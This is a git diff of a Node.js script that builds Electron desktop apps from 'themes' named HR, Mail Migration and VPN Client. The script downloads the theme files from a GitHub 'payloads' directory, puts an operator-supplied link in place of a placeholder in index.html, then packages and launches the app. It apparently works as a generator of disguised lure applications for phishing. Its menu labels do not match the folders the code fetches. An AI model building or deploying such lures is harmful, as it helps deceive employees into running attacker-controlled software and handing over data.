@@ -1,22 +1,48 @@
 const fs = require('fs');
 const https = require('https');
 const { execSync } = require('child_process');
-const prompt = require('prompt-sync')();
+const readline = require('readline');
+
+const rl = readline.createInterface({
+    input: process.stdin,
+    output: process.stdout
+});
 
 async function main() {
-    const installFolderInput = prompt('What is the folder name?\n').trim();
-    fs.mkdirSync(installFolderInput, { recursive: true });
-    process.chdir(installFolderInput);
-    console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);
-
     try {
+        const installFolderInput = await askQuestion('What is the folder name?\n');
+        fs.mkdirSync(installFolderInput.trim(), { recursive: true });
+        process.chdir(installFolderInput);
+        console.log(`Folder created. Trying to install into: ${process.cwd()}\n`);
+
         execSync('npm init -y', { stdio: 'inherit' });
         console.log('npm init completed successfully.\n');
-        const choice = prompt('Which theme? 1) HR 2) Mail Migration 3) VPN Client').trim();
-        await handleChoice(choice);
+
+        let choice;
+        do {
+            choice = await askQuestion('Which theme? 1) HR 2) Mail Migration 3) VPN Client\n');
+        } while (!(choice === '1' || choice === '2' || choice === '3'));
+
+        await handleChoice(choice.trim());
+        console.log('Theme downloaded. Continuing to the next step\n');
+        updatePackageJson();
+	execSync('npm run make', { stdio: 'inherit' });
+	console.log("");
+	console.log("Your shiny new app has been built. Lets test it");
+	startApp();
     } catch (error) {
         console.error('Error:', error);
+    } finally {
+        rl.close();
     }
+}
+
+function askQuestion(question) {
+    return new Promise((resolve, reject) => {
+        rl.question(question, (answer) => {
+            resolve(answer);
+        });
+    });
 }
 
 async function downloadFile(url, filename) {
@@ -37,17 +63,6 @@ async function downloadFile(url, filename) {
 }
 
 async function handleChoice(choice) {
-    if (choice === '1' || choice === '2' || choice === '3') {
-        await downloadThemes(choice);
-        console.log('Theme downloaded. Continuing to the next step\n');
-        updatePackageJson();
-    } else {
-        console.log('Invalid choice. Please enter a valid option.');
-        await main();
-    }
-}
-
-async function downloadThemes(choice) {
     console.log("Make a choice from these options");
 
     const filesForChoice = [
@@ -58,32 +73,61 @@ async function downloadThemes(choice) {
         'loading.gif'
     ];
 
-    const filesForChoice2And3 = [
-        'index.html',
-        'styles.css',
-        'index.js',
-        'app.ico',
-        'loading.gif'
-    ];
-
-    const baseURLChoice2 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/';
-    const baseURLChoice3 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/some_other_folder/';
-
     if (choice === '1') {
-        await Promise.all(filesForChoice.map(file =>
-            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/${file}`, file)
-        ));
+        await downloadFiles('migration', filesForChoice);
     } else if (choice === '2') {
-        await Promise.all(filesForChoice.map(file =>
-            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/${file}`, file)
-        ));
+        const userLink = await askQuestion('Enter the link for Mail Migration:\n');
+        await replaceLinkAndDownload('securityportal', userLink.trim(), filesForChoice);
     } else if (choice === '3') {
-        await Promise.all(filesForChoice.map(file =>
-            downloadFile(`https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/hrportal/${file}`, file)
-        ));
+        const userLink = await askQuestion('Enter the link for VPN Client:\n');
+        await replaceLinkAndDownload('hrportal', userLink.trim(), filesForChoice);
     } else {
         console.log("Invalid choice. Please choose again.");
-        // Here, you might want to add a prompt or input method for the user to choose again
+        await handleChoice(await askQuestion('Which theme? 1) HR 2) Mail Migration 3) VPN Client\n'));
+    }
+}
+
+async function downloadFiles(folder, files) {
+    const baseURLChoice1 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/migration/';
+    const baseURLChoice2 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/securityportal/';
+    const baseURLChoice3 = 'https://raw.githubusercontent.com/itssixtyn3in/itssixtyn3in.github.io/main/payloads/training/';
+
+    let baseURL;
+    if (folder === 'migration') {
+        baseURL = baseURLChoice1;
+    } else if (folder === 'securityportal') {
+        baseURL = baseURLChoice2;
+    } else if (folder === 'hrportal') {
+        baseURL = baseURLChoice3;
+    } else {
+        throw new Error('Invalid folder provided.');
+    }
+
+    try {
+        await Promise.all(
+            files.map(async (file) => {
+                const url = `${baseURL}${file}`;
+                await downloadFile(url, file);
+            })
+        );
+    } catch (error) {
+        throw new Error(`Error downloading files: ${error.message}`);
+    }
+}
+
+async function replaceLinkAndDownload(folder, userLink, files) {
+    try {
+        await downloadFiles(folder, files); // Download files first
+
+        const htmlFilePath = `./${files[0]}`;
+        const htmlContent = fs.readFileSync(htmlFilePath, 'utf-8');
+        const replacedContent = htmlContent.replace('http://127.0.0.1', userLink);
+        fs.writeFileSync(htmlFilePath, replacedContent, 'utf-8');
+
+        console.log('Link replaced in index.html. Continuing...');
+        updatePackageJson();
+    } catch (error) {
+        console.error('Error replacing link and downloading files:', error);
     }
 }
 
@@ -136,13 +180,21 @@ function updatePackageJson() {
 function installElectron() {
     try {
         execSync('npm install electron --save-dev', { stdio: 'inherit' });
-        //execSync('npm run start', { stdio: 'inherit' });
-	execSync('npm install --save-dev @electron-forge/cli', { stdio: 'inherit' });
-	execSync('npx electron-forge import', { stdio: 'inherit' });
-execSync('npm run make', { stdio: 'inherit' });
+        execSync('npm install --save-dev @electron-forge/cli', { stdio: 'inherit' });
+        execSync('npx electron-forge import', { stdio: 'inherit' });
+        //execSync('npm run make', { stdio: 'inherit' });
+        
     } catch (error) {
         console.error('Error installing/running Electron:', error);
     }
+}
+
+function startApp() {
+    console.log("");
+    console.log("Executable Created!");
+    console.log("");
+    console.log("Launching app test");
+    execSync('npm run start', { stdio: 'inherit' });
 }
 
 main();
